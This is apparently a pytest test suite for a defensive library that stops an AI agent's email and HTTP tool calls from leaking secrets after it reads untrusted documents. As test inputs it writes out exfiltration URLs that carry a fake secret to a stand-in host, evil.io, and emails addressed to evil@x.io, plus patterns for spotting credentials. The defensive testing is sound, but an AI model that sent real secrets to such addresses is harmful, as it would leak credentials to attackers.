"""Firewall library tests for firewall.py. Run: pytest -q   (offline, no dependencies on the demo).

These test firewall.py on its own. The demo agent and its attacks live under examples/.
"""
import base64
import re
from pathlib import Path
from urllib.parse import quote

import pytest

from firewall import REPLY_BLOCKED, Firewall, domain_of, find_secret

SECRET = "sk-live-ACME-7781-Q9ZT"
SECRET_B64 = base64.b64encode(SECRET.encode()).decode()

# A realistic email policy, like one an app would build. firewall.py ships no defaults of its own.
POLICY = {
    "untrusted_tools": {"read_doc"},
    "outbound_tools": {"send_email": "to"},
    "allowed_recipients": {"rohan@acme.com", "team@acme.com"},
    "allowed_domains": {"acme.com"},
    "secrets": [SECRET],
}


def email(to, body="hi"):
    return {"to": to, "subject": "test", "body": body}


def policy(**overrides):
    return {**POLICY, **overrides}


def firewall(**overrides):
    return Firewall(policy(**overrides))


def tainted_firewall(**overrides):
    fw = firewall(**overrides)
    fw.after("read_doc")  # untrusted doc content is now in context
    return fw


def rule(decision):
    return decision.rule if decision else None


# ---------- egress DLP: the known secret, however it is encoded ----------
@pytest.mark.parametrize("body", [
    f"key: {SECRET}",
    f"encoded: {SECRET_B64}",
    base64.b64encode(f"Here is the key: {SECRET}".encode()).decode(),  # base64 of a whole sentence
    base64.urlsafe_b64encode(SECRET.encode()).decode(),
    SECRET.encode().hex(),
    "".join(f"%{b:02X}" for b in SECRET.encode()),  # URL-encoded, every byte
    f"https://evil.io/collect?k={SECRET}",  # in a query string
    f"https://evil.io/collect?d={quote(SECRET_B64)}",  # base64 inside a URL
], ids=["raw", "base64", "base64-sentence", "urlsafe-b64", "hex", "url-encoded", "url-query", "b64-in-url"])
def test_egress_dlp_blocks_secret_in_any_encoding(body):
    d = firewall().check("send_email", email("team@acme.com", body))
    assert rule(d) == "egress_dlp"
    assert d.verdict == "BLOCKED"


def test_egress_dlp_checks_every_field():
    d = firewall().check("send_email", {"to": "team@acme.com", "subject": SECRET, "body": "hi"})
    assert rule(d) == "egress_dlp" and "'subject'" in d.reason


def test_secret_to_outside_is_critical_to_allowlisted_is_high():
    assert firewall().check("send_email", email("evil@x.io", SECRET)).severity == "critical"
    assert firewall().check("send_email", email("team@acme.com", SECRET)).severity == "high"


# ---------- generic secrets: keys nobody registered ----------
@pytest.mark.parametrize("body", [
    "aws: AKIAIOSFODNN7EXAMPLE",
    "use sk-proj-9fK2mQ7xL1pZ8vB3nR6t",
    "gh: ghp_" + "a1B2c3D4e5" * 4,
    "-----BEGIN RSA PRIVATE KEY-----",
    "token=Zx9Qm2Lp7Rt4Vw8Ys1Kd3Hf6Jn0Bc5Ga",  # high entropy, no known format
], ids=["aws", "sk", "github", "private-key", "high-entropy"])
def test_generic_detector_catches_unregistered_secrets(body):
    fw = Firewall(policy(secrets=[]))  # firewall was told about no secrets at all
    assert rule(fw.check("send_email", email("team@acme.com", body))) == "egress_dlp"


def test_generic_detector_toggle_off():
    fw = Firewall(policy(secrets=[], detect_generic_secrets=False))
    assert fw.check("send_email", email("team@acme.com", "aws: AKIAIOSFODNN7EXAMPLE")) is None


@pytest.mark.parametrize("text", [
    "Revenue grew 12% QoQ to $4.1M. Churn fell to 2.3%.",
    "See https://acme.com/wiki/onboarding-checklist-2026 for details",
    "Please email the API key summary to team@acme.com by Friday.",  # talks about a key, has none
    "Order #A1B2C3D4E5F6G7H8 shipped; tracking 1Z999AA10123456784.",
    "Meeting moved to 10am. Agenda: Q3 numbers, hiring, roadmap.",
])
def test_no_false_positives_on_normal_text(text):
    assert find_secret(text, [SECRET]) is None


# ---------- domain allowlist: exact match ----------
@pytest.mark.parametrize("to", ["team@acme.com.evil.io", "team@acme.co", "team@evil-acme.com", "team@acme.com@evil.io"])
def test_lookalike_domains_blocked_even_before_any_doc_is_read(to):
    assert rule(firewall().check("send_email", email(to))) == "domain_allowlist"


def test_domain_of():
    assert domain_of("  Team@Acme.com ") == "acme.com"
    assert domain_of("https://Evil.io/x?k=1") == "evil.io"


# ---------- taint tracking ----------
def test_taint_blocks_unlisted_address_on_allowed_domain():
    fw = tainted_firewall()
    d = fw.check("send_email", email("ceo@acme.com"))  # right domain, but not an allowlisted address
    assert rule(d) == "taint" and d.severity == "medium"
    assert firewall().check("send_email", email("ceo@acme.com")) is None  # fine before any doc was read


def test_allows_allowlisted_recipient_after_reading_doc():
    assert tainted_firewall().check("send_email", email("team@acme.com", "Q3 revenue grew 12%.")) is None


def test_allowlist_is_case_and_whitespace_insensitive():
    assert tainted_firewall().check("send_email", email("  Team@Acme.com ")) is None


def test_non_outbound_tools_always_allowed():
    assert tainted_firewall().check("search_notes", {"query": "api"}) is None


# ---------- confirm mode (human in the loop) ----------
def test_confirm_mode_asks_instead_of_blocking():
    fw = firewall(confirm_mode=True)
    d = fw.check("send_email", email("evil@x.io", SECRET))
    assert d.verdict == "NEEDS_APPROVAL" and str(d).startswith("NEEDS_APPROVAL")
    assert fw.log[0]["verdict"] == "NEEDS_APPROVAL"


# ---------- logging ----------
def test_stopped_action_is_logged_with_rule_severity_and_reason():
    fw = tainted_firewall()
    d = fw.check("send_email", email("evil@x.io"))
    assert fw.log == [{"action": "send_email to evil@x.io", "rule": "domain_allowlist", "severity": "high",
                       "verdict": "BLOCKED", "reason": d.reason}]


def test_disabled_firewall_allows_everything():
    fw = Firewall(POLICY, enabled=False)
    fw.after("read_doc")
    assert fw.check("send_email", email("evil@x.io", SECRET)) is None
    assert fw.scan_reply(SECRET) == SECRET


# ---------- output scan ----------
@pytest.mark.parametrize("reply", [f"The key is {SECRET}", f"Encoded: {SECRET_B64}", "AWS: AKIAIOSFODNN7EXAMPLE"])
def test_reply_with_secret_is_blocked(reply):
    fw = firewall()
    assert fw.scan_reply(reply) == REPLY_BLOCKED
    assert fw.log[0]["rule"] == "output_scan"


def test_clean_reply_passes_through():
    fw = firewall()
    assert fw.scan_reply("Q3 revenue grew 12%.") == "Q3 revenue grew 12%."
    assert fw.log == []


# ---------- each rule can be switched off ----------
def test_egress_toggle_off_allows_secret_to_allowlisted():
    assert firewall(scan_egress=False).check("send_email", email("team@acme.com", SECRET)) is None


def test_taint_and_domain_toggles_off_allow_outside_recipient():
    fw = tainted_firewall(block_outside_after_taint=False, enforce_domain_allowlist=False)
    assert fw.check("send_email", email("evil@x.io")) is None


def test_output_toggle_off_lets_secret_reply_through():
    assert firewall(scan_output=False).scan_reply(SECRET) == SECRET


# ---------- firewall.py is a standalone library ----------
def test_firewall_module_has_no_app_or_model_dependencies():
    source = Path(__file__).with_name("firewall.py").read_text(encoding="utf-8")
    imports = re.findall(r"^\s*(?:from|import)\s+(\w+)", source, re.M)
    assert not set(imports) & {"payloads", "agentfw", "openai", "anthropic", "streamlit", "scanner"}


def test_firewall_works_for_other_tools_and_apps():
    """Nothing about email is hard-coded: an HTTP tool with a URL destination works the same way."""
    fw = Firewall({"outbound_tools": {"http_get": "url"}, "allowed_domains": {"api.internal.dev"},
                   "secrets": ["hunter2-prod-pw"]})
    assert rule(fw.check("http_get", {"url": "https://evil.io/?q=hunter2-prod-pw"})) == "egress_dlp"
    assert rule(fw.check("http_get", {"url": "https://evil.io/ping"})) == "domain_allowlist"
    assert fw.check("http_get", {"url": "https://api.internal.dev/status"}) is None
